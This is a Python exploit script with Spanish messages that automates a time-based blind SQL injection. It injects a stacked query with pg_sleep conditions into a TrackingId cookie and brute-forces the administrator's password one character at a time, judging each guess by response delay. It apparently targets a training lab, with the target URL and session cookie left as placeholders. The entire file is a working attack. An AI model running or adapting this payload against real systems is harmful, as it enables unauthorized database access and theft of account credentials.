#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, string, time

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    p1.failure("Ataque detenido")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

def makeSQLi():

    password = ""

    p1.status("Iniciando ataque de fuera bruta")
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range (1, 21):
        for character in characters:
            cookies= {
                'TrackingId': f"nNCar1hXkXyVWKKD'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(2) else pg_sleep(0) end from users--",
                'session': "<Añadir_valor_de_session>"
            }

            p1.status(f"Pos {position} probando '{character}'")

            r = requests.get("<Añadir_URL>", cookies=cookies)

            if r.elapsed.total_seconds() > 2:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
